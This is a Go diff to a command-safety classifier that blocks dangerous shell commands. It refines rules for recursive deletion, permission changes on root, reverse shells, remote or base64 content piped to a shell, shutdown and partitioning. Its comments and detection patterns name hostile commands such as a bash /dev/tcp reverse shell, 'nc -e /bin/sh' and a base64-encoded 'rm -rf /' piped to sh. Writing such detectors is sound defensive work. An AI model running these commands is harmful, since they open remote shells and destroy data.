@@ -83,10 +83,12 @@ func recursiveDeleteRootRule() rule {
 				return ClassifyResult{}, false
 			}
 			// Check for recursive+force flags.
+			// Stop at command separators — flags beyond a separator
+			// belong to a different command.
 			hasRecursive := false
 			hasForce := false
 			for _, f := range fields[1:] {
-				if f == "--" {
+				if f == "--" || isCommandSeparator(f) {
 					break
 				}
 				if strings.HasPrefix(f, "-") && !strings.HasPrefix(f, "--") {
@@ -108,7 +110,12 @@ func recursiveDeleteRootRule() rule {
 				return ClassifyResult{}, false
 			}
 			// Check for dangerous targets using path normalization.
+			// Stop at command separators (&&, ||, ;, |) — tokens beyond
+			// a separator belong to a different command.
 			for _, f := range fields[1:] {
+				if isCommandSeparator(f) {
+					break
+				}
 				if isDangerousTarget(f) {
 					return ClassifyResult{
 						Decision: Forbidden,
@@ -127,7 +134,7 @@ func recursiveDeleteRootRule() rule {
 			hasRecursive := false
 			hasForce := false
 			for _, a := range args {
-				if a == "--" {
+				if a == "--" || isCommandSeparator(a) {
 					break
 				}
 				if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") {
@@ -149,6 +156,9 @@ func recursiveDeleteRootRule() rule {
 				return ClassifyResult{}, false
 			}
 			for _, a := range args {
+				if isCommandSeparator(a) {
+					break
+				}
 				if isDangerousTarget(a) {
 					return ClassifyResult{
 						Decision: Forbidden,
@@ -211,7 +221,7 @@ func reverseShellRule() rule {
 			checkers := []func() (ClassifyResult, bool){
 				func() (ClassifyResult, bool) { return rsDevTCP(command) },
 				func() (ClassifyResult, bool) { return rsNC(lower) },
-				func() (ClassifyResult, bool) { return rsNcat(lower) },
+				func() (ClassifyResult, bool) { return rsNcat(command) },
 				func() (ClassifyResult, bool) { return rsPythonSocket(lower) },
 				func() (ClassifyResult, bool) { return rsPerlSocket(lower) },
 				func() (ClassifyResult, bool) { return rsSocat(lower) },
@@ -261,11 +271,129 @@ func rsResult(reason string) (ClassifyResult, bool) {
 }
 
 // rsDevTCP detects /dev/tcp and /dev/udp reverse shells in a command string.
+//
+// Simple connectivity tests like "echo > /dev/tcp/host/port" or
+// "timeout 5 < /dev/tcp/host/port" are NOT reverse shells.
+// Actual reverse shells use fd redirection: "exec 3<>/dev/tcp/host/port",
+// ">&3", "0>&1", "/bin/sh", "/bin/bash", etc.
+//
+// We require the command to contain BOTH /dev/tcp (or /dev/udp) AND at
+// least one reverse-shell indicator.
 func rsDevTCP(command string) (ClassifyResult, bool) {
-	if strings.Contains(command, "/dev/tcp/") || strings.Contains(command, "/dev/udp/") {
+	if !strings.Contains(command, "/dev/tcp/") && !strings.Contains(command, "/dev/udp/") {
+		return ClassifyResult{}, false
+	}
+	lower := strings.ToLower(command)
+	if rsDevTCPHasIndicator(lower) {
 		return rsResult("reverse shell via /dev/tcp or /dev/udp detected")
 	}
 	return ClassifyResult{}, false
+}
+
+// rsDevTCPHasIndicator reports whether a (lowered) command string contains
+// indicators of an actual /dev/tcp reverse shell rather than a simple
+// connectivity test.
+func rsDevTCPHasIndicator(lower string) bool {
+	// exec with fd redirection: "exec 3<>/dev/tcp/..."
+	if strings.Contains(lower, "exec ") {
+		return true
+	}
+	// Shell execution via the socket.
+	if strings.Contains(lower, "/bin/sh") || strings.Contains(lower, "/bin/bash") {
+		return true
+	}
+	// Python/C fd duplication.
+	if strings.Contains(lower, "dup2") {
+		return true
+	}
+	// Bare >& (stdout+stderr redirect without a preceding fd digit) is a
+	// reverse shell indicator. "bash -i >& /dev/tcp/host/port" is a classic
+	// reverse shell pattern. Check for ">& " (followed by space) or trailing ">&".
+	if strings.Contains(lower, ">& ") || strings.HasSuffix(lower, ">&") {
+		return true
+	}
+	// Look for fd redirection operators: >&N, <&N, N>&M where N >= 3
+	// but exclude the common stderr redirect "2>&1" and "1>&2".
+	return hasNonStdFDRedirect(lower)
+}
+
+// hasNonStdFDRedirect reports whether s contains a file-descriptor redirect
+// that is NOT the standard "2>&1" or "1>&2" patterns. Non-standard fd
+// redirects like ">&3", "0>&1", "1>&0", "<&5" are indicators of reverse
+// shell fd piping.
+func hasNonStdFDRedirect(s string) bool {
+	for i := 0; i < len(s); i++ {
+		if s[i] == '>' && i+1 < len(s) && s[i+1] == '&' {
+			if isOutputFDRedirectSuspicious(s, i) {
+				return true
+			}
+			i += 2 // skip past >&
+			continue
+		}
+		if s[i] == '<' && i+1 < len(s) && s[i+1] == '&' {
+			if isInputFDRedirectSuspicious(s, i) {
+				return true
+			}
+			i += 2 // skip past <&
+			continue
+		}
+	}
+	return false
+}
+
+// digitFDBefore returns the single-digit fd number immediately before
+// position i, or -1 if none.
+func digitFDBefore(s string, i int) int {
+	if i > 0 && s[i-1] >= '0' && s[i-1] <= '9' {
+		return int(s[i-1] - '0')
+	}
+	return -1
+}
+
+// digitFDAfter returns the single-digit fd number at position i+2
+// (after the two-character operator >&/<&), or -1 if none.
+func digitFDAfter(s string, i int) int {
+	if i+2 < len(s) && s[i+2] >= '0' && s[i+2] <= '9' {
+		return int(s[i+2] - '0')
+	}
+	return -1
+}
+
+// isOutputFDRedirectSuspicious checks whether the >& at position i is a
+// suspicious (non-standard) fd redirect. Standard patterns "2>&1" and "1>&2"
+// are not suspicious.
+func isOutputFDRedirectSuspicious(s string, i int) bool {
+	fdBefore := digitFDBefore(s, i)
+	fdAfter := digitFDAfter(s, i)
+	// "2>&1" or "1>&2" are standard stderr/stdout swaps — not suspicious.
+	if (fdBefore == 2 && fdAfter == 1) || (fdBefore == 1 && fdAfter == 2) {
+		return false
+	}
+	// Redirect to fd > 2 is suspicious (>&3, 1>&3).
+	if fdAfter > 2 {
+		return true
+	}
+	// "0>&1" is a reverse shell pattern (redirect stdin to stdout).
+	if fdBefore == 0 && fdAfter == 1 {
+		return true
+	}
+	// "1>&0" is also suspicious.
+	return fdBefore == 1 && fdAfter == 0
+}
+
+// isInputFDRedirectSuspicious checks whether the <& at position i is a
+// suspicious (non-standard) fd input redirect. Redirects like "<&3" indicate
+// reverse shell fd piping. "0<&1" (redirect stdin from stdout) is also a
+// classic reverse shell pattern.
+func isInputFDRedirectSuspicious(s string, i int) bool {
+	fdBefore := digitFDBefore(s, i)
+	fdAfter := digitFDAfter(s, i)
+	// <&3, <&4, etc. — input from non-standard fd.
+	if fdAfter > 2 {
+		return true
+	}
+	// 0<&1 — redirect stdin from stdout (classic reverse shell pattern).
+	return fdBefore == 0 && fdAfter == 1
 }
 
 // rsNC detects nc -e or nc -c (netcat execute) reverse shells.
@@ -285,8 +413,15 @@ func rsNC(lower string) (ClassifyResult, bool) {
 
 // rsNcat detects ncat -e, ncat -c, or ncat --exec reverse shells.
 // It requires "ncat" to appear as a standalone command word.
-func rsNcat(lower string) (ClassifyResult, bool) {
-	if ncSegmentHasExecFlag(lower, "ncat") {
+//
+// It passes the ORIGINAL (non-lowered) command to ncSegmentHasExecFlag so
+// that ncat's -C flag (CRLF line endings) is not confused with -c (execute).
+// ncSegmentHasExecFlag lowercases internally for command matching but uses
+// original case for flag matching.
+func rsNcat(command string) (ClassifyResult, bool) {
+	// Use original case: ncSegmentHasExecFlag lowercases for command matching
+	// but preserves case for flag matching (-C ≠ -c).
+	if ncSegmentHasExecFlag(command, "ncat") {
 		return rsResult("reverse shell via ncat detected")
 	}
 	return ClassifyResult{}, false
@@ -296,19 +431,94 @@ func rsNcat(lower string) (ClassifyResult, bool) {
 // and checks whether any segment contains a standalone occurrence of cmd (e.g.
 // "nc" or "ncat") together with an -e, -c, or --exec flag. This prevents
 // flags from unrelated segments (like "ping -c 3") from triggering the rule.
-func ncSegmentHasExecFlag(lower, cmd string) bool {
+//
+// It also rejects the match when the segment contains a -z flag (zero-I/O
+// scan mode) because nc -z is always a connectivity test, never a reverse
+// shell. Likewise, PowerShell "Get-Command" listing nc is not a shell.
+//
+// The first parameter may be original-case or already lowered. The function
+// lowercases it internally for command matching (hasStandaloneCommand) so
+// that mixed-case commands like "Ncat" are found. Flag matching (-c vs -C)
+// uses the original string so that ncat's -C (CRLF) is not confused with
+// -c (execute).
+func ncSegmentHasExecFlag(s, cmd string) bool {
+	lower := strings.ToLower(s)
 	if !hasStandaloneCommand(lower, cmd) {
+		return false
+	}
+	// PowerShell Get-Command just lists available commands — never dangerous.
+	if strings.Contains(lower, "get-command") {
 		return false
 	}
 	// Quick path: if there are no compound operators, check the whole string.
 	if !strings.ContainsAny(lower, "&;|") {
-		return strings.Contains(lower, " -e") || strings.Contains(lower, " -c") || strings.Contains(lower, " --exec")
+		return ncSegmentExecNoScan(s)
 	}
-	for _, seg := range splitCompoundSegments(lower) {
-		if hasStandaloneCommand(seg, cmd) &&
-			(strings.Contains(seg, " -e") || strings.Contains(seg, " -c") || strings.Contains(seg, " --exec")) {
+	for _, seg := range splitCompoundSegments(s) {
+		segLower := strings.ToLower(seg)
+		if hasStandaloneCommand(segLower, cmd) && ncSegmentExecNoScan(seg) {
 			return true
 		}
+	}
+	return false
+}
+
+// ncSegmentExecNoScan reports whether a command segment contains an nc/ncat
+// exec flag (-e, -c, --exec) as a whole flag AND does not contain the -z
+// (zero-I/O / scan) flag. The -z flag indicates a port scan or connectivity
+// test, which is never a reverse shell.
+//
+// The -z flag may appear combined (e.g., -zv, -zuv) so we check for -z
+// anywhere in short-flag groups in addition to standalone -z.
+func ncSegmentExecNoScan(seg string) bool {
+	if ncHasScanFlag(seg) {
+		return false
+	}
+	return hasWholeFlag(seg, "-e") || hasWholeFlag(seg, "-c") || hasWholeFlag(seg, "--exec")
+}
+
+// ncHasScanFlag reports whether s contains nc/ncat -z flag (zero-I/O mode).
+// The flag may appear standalone (-z) or combined with other short flags
+// (-zv, -zuv, -vz, etc.).
+func ncHasScanFlag(s string) bool {
+	for _, f := range strings.Fields(s) {
+		if f == "-z" {
+			return true
+		}
+		// Combined short flags: -zv, -zuv, -vz, etc.
+		// Must start with '-', not be '--', and contain 'z'.
+		if len(f) > 2 && f[0] == '-' && f[1] != '-' && strings.ContainsRune(f, 'z') {
+			return true
+		}
+	}
+	return false
+}
+
+// hasWholeFlag reports whether s contains the given flag as a whole word.
+// The flag must be preceded by whitespace (or start-of-string) and followed
+// by whitespace, end-of-string, or another flag prefix '-'.
+// Example: hasWholeFlag("nc -e /bin/sh", "-e") => true
+//
+//	hasWholeFlag("wget -ErrorAction ...", "-e") => false
+func hasWholeFlag(s, flag string) bool {
+	// Normalise: if the caller passed " --exec" strip the leading space so
+	// the boundary check below works correctly.
+	flag = strings.TrimLeft(flag, " ")
+	for off := 0; off < len(s); {
+		idx := strings.Index(s[off:], flag)
+		if idx < 0 {
+			return false
+		}
+		pos := off + idx
+		end := pos + len(flag)
+		// Left boundary: must be preceded by whitespace or start-of-string.
+		leftOK := pos == 0 || s[pos-1] == ' ' || s[pos-1] == '\t'
+		// Right boundary: must be followed by whitespace, EOF, or '-' (next flag).
+		rightOK := end >= len(s) || s[end] == ' ' || s[end] == '\t' || s[end] == '-'
+		if leftOK && rightOK {
+			return true
+		}
+		off = pos + 1
 	}
 	return false
 }
@@ -422,23 +632,45 @@ func rsOpenSSLPipe(lower, command string) (ClassifyResult, bool) {
 	return ClassifyResult{}, false
 }
 
-// rsArgsDevTCP detects /dev/tcp and /dev/udp patterns in argument list.
+// rsArgsDevTCP detects /dev/tcp and /dev/udp reverse shell patterns in
+// argument list. Like rsDevTCP, it requires additional reverse-shell
+// indicators (exec, fd redirection, shell invocation) to avoid flagging
+// simple connectivity tests.
 func rsArgsDevTCP(args []string) (ClassifyResult, bool) {
+	hasDevTCP := false
 	for _, a := range args {
 		if strings.Contains(a, "/dev/tcp/") || strings.Contains(a, "/dev/udp/") {
-			return rsResult("reverse shell via /dev/tcp or /dev/udp detected")
+			hasDevTCP = true
+			break
 		}
+	}
+	if !hasDevTCP {
+		return ClassifyResult{}, false
+	}
+	// Reuse rsDevTCPHasIndicator for consistent indicator checking.
+	joined := strings.ToLower(strings.Join(args, " "))
+	if rsDevTCPHasIndicator(joined) {
+		return rsResult("reverse shell via /dev/tcp or /dev/udp detected")
 	}
 	return ClassifyResult{}, false
 }
 
 // rsArgsNCExec detects nc/ncat/netcat -e/-c/--exec patterns in arguments.
+// It skips if -z (scan mode) is present, since that is a connectivity test.
 func rsArgsNCExec(baseLower string, args []string) (ClassifyResult, bool) {
 	if baseLower == "nc" || baseLower == "ncat" || baseLower == "netcat" {
+		hasExec := false
+		hasScan := false
 		for _, a := range args {
-			if a == "-e" || a == "-c" || a == "--exec" {
-				return rsResult("reverse shell via " + baseLower + " detected")
+			switch a {
+			case "-e", "-c", "--exec":
+				hasExec = true
+			case "-z":
+				hasScan = true
 			}
+		}
+		if hasExec && !hasScan {
+			return rsResult("reverse shell via " + baseLower + " detected")
 		}
 	}
 	return ClassifyResult{}, false
@@ -498,100 +730,56 @@ func rsArgsPerl(baseLower, lower string) (ClassifyResult, bool) {
 	return ClassifyResult{}, false
 }
 
-func chmodRecursiveRootRule() rule {
-	return rule{
-		Name: "chmod-recursive-root",
-		Match: func(command string) (ClassifyResult, bool) {
-			fields := strings.Fields(command)
-			if len(fields) == 0 {
-				return ClassifyResult{}, false
-			}
-			if baseCommand(fields[0]) != "chmod" {
-				return ClassifyResult{}, false
-			}
-			cmd := strings.Join(fields, " ")
-			if !strings.Contains(cmd, "-R") && !strings.Contains(cmd, flagRecursive) {
-				return ClassifyResult{}, false
-			}
-			// Check for root or home targets.
-			for _, f := range fields {
-				if isDangerousTarget(f) {
-					return ClassifyResult{
-						Decision: Forbidden,
-						Reason:   "recursive chmod on root or home directory",
-						Rule:     "chmod-recursive-root",
-					}, true
-				}
-			}
-			return ClassifyResult{}, false
-		},
-		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
-			base := baseCommand(name)
-			if base != "chmod" {
-				return ClassifyResult{}, false
-			}
-			hasRecursive := false
-			for _, a := range args {
-				if a == "-R" || a == flagRecursive {
-					hasRecursive = true
-				} else if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") {
-					// Check for R in bundled short flags like -vR, -Rv.
-					if strings.Contains(a, "R") {
-						hasRecursive = true
-					}
-				}
-			}
-			if !hasRecursive {
-				return ClassifyResult{}, false
-			}
-			for _, a := range args {
-				if isDangerousTarget(a) {
-					return ClassifyResult{
-						Decision: Forbidden,
-						Reason:   "recursive chmod on root or home directory",
-						Rule:     "chmod-recursive-root",
-					}, true
-				}
-			}
-			return ClassifyResult{}, false
-		},
+// recursivePermRootRule detects recursive chmod or chown targeting dangerous
+// paths (root, home directory, etc.). This is a combined rule that replaces the
+// former chmod-recursive-root and chown-recursive-root rules.
+func recursivePermRootRule() rule {
+	permCmds := map[string]string{
+		"chmod": "recursive chmod on root or home directory",
+		"chown": "recursive chown on root or home directory",
 	}
-}
+	const ruleName = "recursive-perm-root"
 
-func chownRecursiveRootRule() rule {
 	return rule{
-		Name: "chown-recursive-root",
+		Name: ruleName,
 		Match: func(command string) (ClassifyResult, bool) {
 			fields := strings.Fields(command)
 			if len(fields) == 0 {
 				return ClassifyResult{}, false
 			}
-			if baseCommand(fields[0]) != "chown" {
+			reason, ok := permCmds[baseCommand(fields[0])]
+			if !ok {
 				return ClassifyResult{}, false
 			}
 			cmd := strings.Join(fields, " ")
 			if !strings.Contains(cmd, "-R") && !strings.Contains(cmd, flagRecursive) {
 				return ClassifyResult{}, false
 			}
-			// Check for root or home targets.
+			// Check for root or home targets. Stop at command separators.
 			for _, f := range fields {
+				if isCommandSeparator(f) {
+					break
+				}
 				if isDangerousTarget(f) {
 					return ClassifyResult{
 						Decision: Forbidden,
-						Reason:   "recursive chown on root or home directory",
-						Rule:     "chown-recursive-root",
+						Reason:   reason,
+						Rule:     ruleName,
 					}, true
 				}
 			}
 			return ClassifyResult{}, false
 		},
 		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
-			base := baseCommand(name)
-			if base != "chown" {
+			reason, ok := permCmds[baseCommand(name)]
+			if !ok {
 				return ClassifyResult{}, false
 			}
 			hasRecursive := false
 			for _, a := range args {
+				if a == "--" || isCommandSeparator(a) {
+					break
+				}
 				if a == "-R" || a == flagRecursive {
 					hasRecursive = true
 				} else if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") {
@@ -605,11 +793,14 @@ func chownRecursiveRootRule() rule {
 				return ClassifyResult{}, false
 			}
 			for _, a := range args {
+				if isCommandSeparator(a) {
+					break
+				}
 				if isDangerousTarget(a) {
 					return ClassifyResult{
 						Decision: Forbidden,
-						Reason:   "recursive chown on root or home directory",
-						Rule:     "chown-recursive-root",
+						Reason:   reason,
+						Rule:     ruleName,
 					}, true
 				}
 			}
@@ -637,6 +828,10 @@ func filesystemFormatRule() rule {
 }
 
 func checkFilesystemFormat(base string, args []string) (ClassifyResult, bool) {
+	// Help/version queries are safe for all commands in this rule.
+	if hasHelpOrVersionFlag(args) {
+		return ClassifyResult{}, false
+	}
 	result := ClassifyResult{
 		Decision: Forbidden,
 		Rule:     "filesystem-format",
@@ -656,7 +851,7 @@ func checkFilesystemFormat(base string, args []string) (ClassifyResult, bool) {
 	// other arguments, so its presence alone is sufficient to allow the command.
 	if base == "fdisk" || base == "parted" {
 		for _, a := range args {
-			if a == "-l" || a == "--list" {
+			if a == "-l" || a == flagList {
 				return ClassifyResult{}, false
 			}
 		}
@@ -666,80 +861,75 @@ func checkFilesystemFormat(base string, args []string) (ClassifyResult, bool) {
 	return ClassifyResult{}, false
 }
 
-func curlPipeShellRule() rule {
+// pipeToShellRule detects piping untrusted content to a shell interpreter.
+// This is a combined rule that replaces the former curl-pipe-shell and
+// base64-pipe-shell rules. It checks for both curl/wget piping to shells and
+// base64-decoded content piping to shells.
+func pipeToShellRule() rule {
 	shells := []string{"sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl", "ruby", "node"}
-	return rule{
-		Name: "curl-pipe-shell",
-		Match: func(command string) (ClassifyResult, bool) {
-			lower := strings.ToLower(command)
-			hasFetcher := strings.Contains(lower, cmdCurl) || strings.Contains(lower, cmdWget)
-			if !hasFetcher {
-				return ClassifyResult{}, false
-			}
-			if !strings.Contains(command, "|") {
-				return ClassifyResult{}, false
-			}
-			// Split on top-level pipes only (ignoring pipes inside $(), backticks, quotes).
-			parts := splitTopLevelPipes(command)
-			for _, part := range parts[1:] {
-				trimmed := strings.TrimSpace(part)
-				fields := strings.Fields(trimmed)
-				if len(fields) == 0 {
-					continue
-				}
-				target := baseCommand(fields[0])
-				for _, sh := range shells {
-					if target == sh {
-						// python/python3 with -c or -m is safe (inline code, not stdin eval).
-						if (target == cmdPython || target == cmdPython3) && isPipeTargetSafePython(fields) {
-							continue
-						}
-						return ClassifyResult{
-							Decision: Forbidden,
-							Reason:   "piping remote content to a shell is dangerous",
-							Rule:     "curl-pipe-shell",
-						}, true
-					}
-				}
-			}
+	const ruleName = "pipe-to-shell"
+
+	// matchCurlPipe checks for curl/wget output piped to a shell.
+	matchCurlPipe := func(command string) (ClassifyResult, bool) {
+		lower := strings.ToLower(command)
+		hasFetcher := strings.Contains(lower, cmdCurl) || strings.Contains(lower, cmdWget)
+		if !hasFetcher {
 			return ClassifyResult{}, false
+		}
+		if !strings.Contains(command, "|") {
+			return ClassifyResult{}, false
+		}
+		// Split on top-level pipes only (ignoring pipes inside $(), backticks, quotes).
+		parts := splitTopLevelPipes(command)
+		for _, part := range parts[1:] {
+			trimmed := strings.TrimSpace(part)
+			fields := strings.Fields(trimmed)
+			if len(fields) == 0 {
+				continue
+			}
+			target := baseCommand(fields[0])
+			for _, sh := range shells {
+				if target == sh {
+					// python/python3 with -c or -m is safe (inline code, not stdin eval).
+					if (target == cmdPython || target == cmdPython3) && isPipeTargetSafePython(fields) {
+						continue
+					}
+					return ClassifyResult{
+						Decision: Forbidden,
+						Reason:   "piping remote content to a shell is dangerous",
+						Rule:     ruleName,
+					}, true
+				}
+			}
+		}
+		return ClassifyResult{}, false
+	}
+
+	return rule{
+		Name: ruleName,
+		Match: func(command string) (ClassifyResult, bool) {
+			// Check curl/wget pipe to shell first.
+			if r, ok := matchCurlPipe(command); ok {
+				return r, true
+			}
+			// Check base64 decode pipe to shell.
+			return matchPipeToShellBase64(command, ruleName)
 		},
 		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
-			// Reconstruct the command and delegate to Match-style logic,
-			// since pipes are shell constructs that appear in the raw string.
 			base := baseCommand(name)
 			lower := strings.ToLower(base)
 			isFetcher := lower == cmdCurl || lower == cmdWget
-			if !isFetcher {
-				return ClassifyResult{}, false
-			}
-			// Check if any arg contains a pipe to a shell.
-			full := base + " " + strings.Join(args, " ")
-			if !strings.Contains(full, "|") {
-				return ClassifyResult{}, false
-			}
-			parts := splitTopLevelPipes(full)
-			for _, part := range parts[1:] {
-				trimmed := strings.TrimSpace(part)
-				fields := strings.Fields(trimmed)
-				if len(fields) == 0 {
-					continue
-				}
-				target := baseCommand(fields[0])
-				for _, sh := range shells {
-					if target == sh {
-						if (target == cmdPython || target == cmdPython3) && isPipeTargetSafePython(fields) {
-							continue
-						}
-						return ClassifyResult{
-							Decision: Forbidden,
-							Reason:   "piping remote content to a shell is dangerous",
-							Rule:     "curl-pipe-shell",
-						}, true
-					}
+			if isFetcher {
+				// Reconstruct the command and delegate to Match-style logic,
+				// since pipes are shell constructs that appear in the raw string.
+				full := base + " " + strings.Join(args, " ")
+				if r, ok := matchCurlPipe(full); ok {
+					return r, true
 				}
 			}
-			return ClassifyResult{}, false
+			// Check base64 decode pipe to shell.
+			full := name + " " + strings.Join(args, " ")
+			return matchPipeToShellBase64(full, ruleName)
 		},
 	}
 }
@@ -769,13 +959,14 @@ func segmentHasBase64Decode(segLower string) bool {
 	return false
 }
 
-// base64PipeShells lists the shell interpreters that matchBase64PipeShell
+// base64PipeShells lists the shell interpreters that matchPipeToShellBase64
 // considers dangerous when receiving piped base64-decoded output.
 var base64PipeShells = []string{"sh", "bash", "zsh", "dash", "ksh", "eval"}
 
-// matchBase64PipeShell returns a Forbidden result if the command pipes
-// base64-decoded output to a shell interpreter.
-func matchBase64PipeShell(command string) (ClassifyResult, bool) {
+// matchPipeToShellBase64 returns a Forbidden result if the command pipes
+// base64-decoded output to a shell interpreter. The ruleName parameter
+// allows the caller to specify the rule name for the result.
+func matchPipeToShellBase64(command string, ruleName RuleName) (ClassifyResult, bool) {
 	lower := strings.ToLower(command)
 	// Must contain base64 with a decode flag.
 	if !strings.Contains(lower, "base64") {
@@ -806,31 +997,13 @@ func matchBase64PipeShell(command string) (ClassifyResult, bool) {
 					return ClassifyResult{
 						Decision: Forbidden,
 						Reason:   "piping base64-decoded content to a shell is dangerous",
-						Rule:     "base64-pipe-shell",
+						Rule:     ruleName,
 					}, true
 				}
 			}
 		}
 	}
 	return ClassifyResult{}, false
-}
-
-// base64PipeShellRule detects base64 decode output piped to a shell.
-// Attackers encode malicious payloads as base64 strings and pipe the decoded
-// output to a shell interpreter to bypass command-string classifiers.
-// Examples: echo "cm0gLXJmIC8=" | base64 -d | sh
-//
-//	base64 --decode payload.txt | bash
-func base64PipeShellRule() rule {
-	return rule{
-		Name:  "base64-pipe-shell",
-		Match: matchBase64PipeShell,
-		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
-			// Pipes are shell constructs; reconstruct and delegate.
-			full := name + " " + strings.Join(args, " ")
-			return matchBase64PipeShell(full)
-		},
-	}
 }
 
 // ifsBypassRule detects $IFS used as a word-splitting bypass in commands.
@@ -905,6 +1078,10 @@ func shutdownRebootRule() rule {
 			}
 			cmd := baseCommand(fields[0])
 			if powerCmds[cmd] {
+				// Windows "shutdown /a" aborts a pending shutdown — safe.
+				if cmd == "shutdown" && containsShutdownAbort(fields[1:]) {
+					return ClassifyResult{}, false
+				}
 				return ClassifyResult{
 					Decision: Forbidden,
 					Reason:   "system shutdown/reboot is forbidden",
@@ -924,6 +1101,10 @@ func shutdownRebootRule() rule {
 		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
 			cmd := baseCommand(name)
 			if powerCmds[cmd] {
+				// Windows "shutdown /a" aborts a pending shutdown — safe.
+				if cmd == "shutdown" && containsShutdownAbort(args) {
+					return ClassifyResult{}, false
+				}
 				return ClassifyResult{
 					Decision: Forbidden,
 					Reason:   "system shutdown/reboot is forbidden",
@@ -940,6 +1121,17 @@ func shutdownRebootRule() rule {
 			return ClassifyResult{}, false
 		},
 	}
+}
+
+// containsShutdownAbort reports whether args contain the Windows shutdown
+// abort flag "/a". "shutdown /a" cancels a pending shutdown and is safe.
+func containsShutdownAbort(args []string) bool {
+	for _, a := range args {
+		if strings.EqualFold(a, "/a") {
+			return true
+		}
+	}
+	return false
 }
 
 // kernelModuleRule matches commands that manipulate kernel modules.
@@ -991,6 +1183,10 @@ func partitionManagementRule() rule {
 				return ClassifyResult{}, false
 			}
 			if partCmds[baseCommand(fields[0])] {
+				// Help/version queries are safe.
+				if hasHelpOrVersionFlag(fields[1:]) {
+					return ClassifyResult{}, false
+				}
 				return ClassifyResult{
 					Decision: Forbidden,
 					Reason:   "disk partition management is forbidden",
@@ -999,8 +1195,12 @@ func partitionManagementRule() rule {
 			}
 			return ClassifyResult{}, false
 		},
-		MatchArgs: func(name string, _ []string) (ClassifyResult, bool) {
+		MatchArgs: func(name string, args []string) (ClassifyResult, bool) {
 			if partCmds[baseCommand(name)] {
+				// Help/version queries are safe.
+				if hasHelpOrVersionFlag(args) {
+					return ClassifyResult{}, false
+				}
 				return ClassifyResult{
 					Decision: Forbidden,
 					Reason:   "disk partition management is forbidden",
@@ -1150,15 +1350,14 @@ func destructiveXargsRule() rule {
 				if baseCommand(fields[0]) != "xargs" {
 					continue
 				}
-				// xargs is the command in this segment; check if any arg is rm.
-				for _, f := range fields[1:] {
-					if baseCommand(f) == "rm" {
-						return ClassifyResult{
-							Decision: Forbidden,
-							Reason:   "xargs with rm is forbidden",
-							Rule:     "destructive-xargs",
-						}, true
-					}
+				// Find the command xargs will execute (first non-xargs-flag arg).
+				cmd := xargsTargetCommand(fields[1:])
+				if cmd != "" && baseCommand(cmd) == "rm" {
+					return ClassifyResult{
+						Decision: Forbidden,
+						Reason:   "xargs with rm is forbidden",
+						Rule:     "destructive-xargs",
+					}, true
 				}
 			}
 			return ClassifyResult{}, false
@@ -1167,15 +1366,14 @@ func destructiveXargsRule() rule {
 			if baseCommand(name) != "xargs" {
 				return ClassifyResult{}, false
 			}
-			for _, a := range args {
-				base := baseCommand(a)
-				if base == "rm" {
-					return ClassifyResult{
-						Decision: Forbidden,
-						Reason:   "xargs with rm is forbidden",
-						Rule:     "destructive-xargs",
-					}, true
-				}
+			// Find the command xargs will execute (first non-xargs-flag arg).
+			cmd := xargsTargetCommand(args)
+			if cmd != "" && baseCommand(cmd) == "rm" {
+				return ClassifyResult{
+					Decision: Forbidden,
+					Reason:   "xargs with rm is forbidden",
+					Rule:     "destructive-xargs",
+				}, true
 			}
 			return ClassifyResult{}, false
 		},
@@ -1220,12 +1418,18 @@ func outputRedirectSystemRule() rule {
 				if j >= len(command) {
 					continue
 				}
-				// Extract the target path token (until next whitespace or end).
+				// Extract the target path token. Stop at shell
+				// metacharacters that cannot be part of a path.
 				end := j
-				for end < len(command) && command[end] != ' ' && command[end] != '\t' {
+				for end < len(command) && !isRedirectTerminator(command[end]) {
 					end++
 				}
 				target := command[j:end]
+				// Skip known-safe /dev/ targets (e.g. /dev/null, /dev/zero)
+				// that are commonly used in shell redirections like 2>/dev/null.
+				if isSafeDevTarget(target) {
+					continue
+				}
 				for _, prefix := range systemWritePrefixes {
 					if strings.HasPrefix(target, prefix) {
 						return ClassifyResult{
@@ -1240,4 +1444,113 @@ func outputRedirectSystemRule() rule {
 		},
 		// No MatchArgs — redirections are shell constructs, not parsed args.
 	}
+}
+
+// safeDevTargets lists exact /dev/ paths that are safe redirection targets.
+// Redirecting to these devices (e.g. 2>/dev/null) is normal shell usage and
+// should not be flagged by output-redirect-system.
+var safeDevTargets = map[string]bool{
+	"/dev/null":    true,
+	"/dev/zero":    true,
+	"/dev/stdout":  true,
+	"/dev/stderr":  true,
+	"/dev/stdin":   true,
+	"/dev/tty":     true,
+	"/dev/random":  true,
+	"/dev/urandom": true,
+}
+
+// safeDevPrefixes lists /dev/ subdirectory prefixes that are safe redirection
+// targets (e.g. /dev/fd/3, /dev/pts/0, /dev/tcp/ for connectivity tests).
+var safeDevPrefixes = []string{"/dev/fd/", "/dev/pts/", "/dev/tcp/", "/dev/udp/"}
+
+// safeProcPrefixes lists /proc/ subdirectory prefixes that are safe
+// redirection targets (e.g. /proc/self/fd/3 which is equivalent to /dev/fd/3).
+var safeProcPrefixes = []string{"/proc/self/fd/"}
+
+// isSafeDevTarget returns true if the redirect target is a known-safe /dev/
+// or /proc/ path. This prevents false positives such as "2>/dev/null" or
+// "> /proc/self/fd/1" being flagged as a dangerous system write.
+func isSafeDevTarget(target string) bool {
+	// Reject paths with traversal components that could escape safe prefixes.
+	if strings.Contains(target, "..") {
+		return false
+	}
+	if safeDevTargets[target] {
+		return true
+	}
+	for _, prefix := range safeDevPrefixes {
+		if strings.HasPrefix(target, prefix) {
+			return true
+		}
+	}
+	for _, prefix := range safeProcPrefixes {
+		if strings.HasPrefix(target, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
+// hasHelpOrVersionFlag returns true if args contains --help, -h, or --version.
+// Commands invoked with these flags only display usage information and are safe.
+func hasHelpOrVersionFlag(args []string) bool {
+	for _, a := range args {
+		switch a {
+		case flagHelp, "-h", flagVersion:
+			return true
+		}
+	}
+	return false
+}
+
+// xargsNoValFlags are xargs flags that take no argument value.
+//
+// Boolean flags: -0, -t, -p, -r, --no-run-if-empty, --verbose, --null, -x, --exit
+var xargsNoValFlags = map[string]bool{
+	"-0": true, "-t": true, "-p": true, "-r": true, "-x": true,
